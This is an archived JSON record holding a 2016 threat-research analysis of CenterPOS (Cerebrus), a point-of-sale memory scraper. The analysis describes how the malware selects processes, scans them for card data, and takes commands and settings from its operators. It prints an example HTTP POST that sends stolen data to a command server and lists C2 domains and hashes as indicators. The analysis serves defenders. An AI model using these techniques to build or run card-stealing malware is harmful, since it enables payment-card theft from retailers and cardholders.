{
    "id": "c663286e-1734-49ac-9526-410cb0cc7116",
    "created_at": "2023-01-12T15:00:15.233074Z",
    "updated_at": "2025-03-27T02:05:41.013532Z",
    "deleted_at": null,
    "sha1_hash": "deae77423f3d9544cd34e6d6cb56d944261ae925",
    "title": "2016-01-28 - CenterPOS- An Evolving POS Threat",
    "authors": "",
    "file_creation_date": "2022-05-28T03:14:24Z",
    "file_modification_date": "2022-05-28T03:14:24Z",
    "file_size": 429908,
    "plain_text": "# CenterPOS: An Evolving POS Threat\n\n**[fireeye.com/blog/threat-research/2016/01/centerpos_an_evolvi.html](https://www.fireeye.com/blog/threat-research/2016/01/centerpos_an_evolvi.html)**\n\n**Introduction**\n\nThere has been no shortage of point-of-sale (POS) threats in the past couple of years. This\ntype of malicious software has gained widespread notoriety in recent time due to its use in\nhigh-profile breaches, some of which involved well-known brick and mortar retailers and led\nto the compromise of millions of payment cards. Our investigation into these threats has led\nto the analysis of a relatively newer POS malware known as CenterPOS.\n\n**CenterPOS**\n\n[CenterPOS malware was initially discovered in September 2015 in a directory filled with](http://blog.trendmicro.com/trendlabs-security-intelligence/two-new-pos-malware-affecting-us-smbs/)\nother POS malware, including NewPoSThings, two Alina variants known as “Spark” and\n“Joker,” and BlackPOS. This CenterPOS sample (171c4c62ab2001c2f2394c3ec021dfa3)\ncontains an internal version of “1.7” and is a memory scraper that iterates through running\nprocesses in order to extract payment card information. The payment card information is\ntransferred to a command and control (CnC) server via HTTP POST:\n\nPOST /2kj1h43.php HTTP/1.1\n\nContent-Type: multipart/form-data; boundary=axlmcc3u.x5w\n\nHost: jackkk[.]com\n\n\n-----\n\nContent-Length: 159\nExpect: 100-continue\nConnection: Keep-Alive\n\n--axlmcc3u.x5w\n\nContent-Disposition: form-data; name=\"userfile\";filename=\"1432.txt\"\nContent-Type: application/octet-stream\n\nAAAAAAAAAAAA\n--axlmcc3u.x5w-\nTable 1 shows several CenterPOS v1.7 variants and their associated CnC locations.\n\nMD5 CnC Version\n\n\n171c4c62ab2001c2f2394c3ec021dfa3 jackkk[.]com\n\n(resolves to 138.204.168.109)\n\n\n1.7\n\n\n7e6b2f107f6dbc1bc406f4359de4c5db 188.120.227.156 1.7\n\nef5e361a6b16d682e1506aba6164feee 188.120.227.156 1.7\n\n\nc9d4ff350f26c11b934e19bb1ef7698d rs000370.fastrootserver[.]de\n\n(resolves to 89.163.209.117)\n\n0d142438f731652b746c9ad7fd1a9850 sobra[.]ws\n\n(resolves to 50.7.193.210)\n\nTable 1: CenterPOS v1.7 samples\n\n\n1.7\n\n1.7\n\n\nWe discovered a live CnC server (the admin panel is shown in Figure 1) that allowed us to\nconfirm that CenterPOS is known as “Cerebrus” in the underground (not to be confused with\nthe RAT known as Cerberus).\n\n\n-----\n\nFigure 1: Cerebrus 1.7 (CenterPOS) Admin Panel Login\n\nFurther investigation revealed that there is a new version of CenterPOS, version 2.0, that is\nfunctionally very similar to version 1.7. The key difference is that version 2.0 uses a\nconfiguration file to store the CnC information. When executed, the malware checks for a\nconfiguration file that can be located in one of three locations:\n\nAppended to the end of the file enclosed by the strings [dup] ... [/dup].\nA file named mscorsv.nlp located in the same directory.\nIn the registry: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Framework.NET\n\nIf a configuration file is not present, the malware will open a dialog box that prompts for a\npassword. If the correct password is entered, a dialog box will appear that allows an operator\nto enter CnC information, as well as a password used to encrypt the configuration file (see\nFigure 2).\n\n\n-----\n\nFigure 2: Cerebrus 2.0 (CenterPOS) Configuration Builder\n\nThe malware contains two modes for scraping memory and looking for credit card\ninformation, a “smart scan” mode and a “normal scan” mode. The “normal scan” mode will\nact nearly the same as v1.7:\n\nThe malware iterates over all processes and begins searching process memory space if the\nprocess meets the following criteria:\n\nThe process is not the current running process.\nThe process name is not in the ignore list.\nThe process name is not “system,” “system idle process,” or “idle.”\nThe process file version info does not contain “microsoft,” “apple inc,” “adobe systems,”\n“intel corporation,” “vmware,” “mozilla,” or “host process for windows services.”\nThe process full path's SHA-256 hash is not in the SHA-256 blacklist.\n\nIf the process meets the criteria list, the malware will search all memory regions within the\nprocess searching for credit card data with regular expressions in the regular expression list.\n\nIn “smart scan” mode, the malware starts by performing a “normal scan.” Any process that\nhas a regular expression match will be added to the “smart scan” list. After the first pass, the\nmalware will only search the processes that are in the “smart scan” list.\n\n\n-----\n\nAfter each iteration of scanning all process memory, the malware takes any data that\nmatches and encrypts it using TripleDES with the key found in the configuration file.\n\nThe malware will send information about the system and the current settings to the CnC\nserver after every other search. The gathered system information includes all system users,\nlogged in users, sessions, process list, and current settings list. Each of these items will be\nsent in a separate HTTP POST request.\n\nThe malware primarily sends data to the CnC server, but can also receive commands. The\nmalware can receive and process the following list of commands:\n\n[restartnow] : Restarts the malware service.\n\n[uninstallnow] : Uninstalls the malware.\n\n[quitnow] : Terminates the current malware process.\n<script> : <script> is a batch script to be run on the system.\n\nIn addition to processing commands, the malware also accepts commands to update its\ncurrent settings. The following list shows the settings that can be changed:\n\n[clientlogs] : Enable or disable logging.\n\n[smartscan] : Enables or disables “smart scan.”\n\n[bincountreset] : Total number of processes to scan before restarting a scan.\n\n[blackmamba] : List of blacklisted values that could be matched on by the regular\nexpressions.\n\n[blackproc] : List of blacklisted process names.\n\n[regexlist] : Updates the regular expression list for searching process memory.\n\n[blacksha256] : Updates the blacklist of full path SHA-256 values for processes.\nProcesses in this black list will be terminated.\n\n[antihack] : Checks the Image File Execution Options settings for several executables\nand deletes the “Debugger” value name settings and deletes them if they exist. The\nexecutable list is: sethc.exe, osk.exe, utilman.exe, magnify.exe, and oks.exe.\n\n[commonblackcards] : Use blackmamba blacklisted values.\n\n[restartafter] : Restarts the service after a number of memory scan iterations.\n\n[restart] : Restarts the malware service.\n\n[uninstall] : Uninstalls the malware.\n\nThe operators control the compromised systems and harvest stolen payment card\ninformation through a web interface located on the CnC server, as shown in Figure 3.\n\n\n-----\n\nFigure 3: Cerebrus 2.0 (CenterPOS) Admin Panel Login\n\nTable 2 shows several CenterPOS v2.0 variants and their associated CnC locations.\n\nMD5 CnC Version\n\n\n1acf2eed3c5a8a85a34e606dd897eaac www.x00x[.]la\n\n(resolves to 193.189.117.58)\n\n\n2.0\n\n\n96b65da18a72987e1dd3be2a947412c5 193.111.139.142 2.0\n\n\na54b0812f003bb15891709ab7a125828 5m0k3[.]lol\n\n(resolves to 193.189.117.58)\n\n1d7d70c0699db32817f910942e7a619a www.amprofile.co[.]uk\n\n(resolves to 193.189.116.29)\n\nTable 2: CenterPOS v2.0 samples\n\n## Conclusion\n\n\n2.0\n\n2.0\n\n\nThere is an increasing demand for POS malware in the underground as cybercriminals\ncontinue to target retailers in order to steal payment card information. CenterPOS, known in\nthe underground as Cerebrus, is continuing to evolve. This version contains functionality that\n\n\n-----\n\nallows cybercriminals to create a configuration file. In contrast to the traditional builder-server\nmodel, the configuration file can be created from the payload itself, allowing the operators to\neasily update the CnC information if necessary.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2016/2016-01-28 - CenterPOS- An Evolving POS Threat.pdf"
    ],
    "report_names": [
        "2016-01-28 - CenterPOS- An Evolving POS Threat.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535615,
    "ts_updated_at": 1743041141,
    "ts_creation_date": 1653707664,
    "ts_modification_date": 1653707664,
    "files": {
        "pdf": "https://archive.orkl.eu/deae77423f3d9544cd34e6d6cb56d944261ae925.pdf",
        "text": "https://archive.orkl.eu/deae77423f3d9544cd34e6d6cb56d944261ae925.txt",
        "img": "https://archive.orkl.eu/deae77423f3d9544cd34e6d6cb56d944261ae925.jpg"
    }
}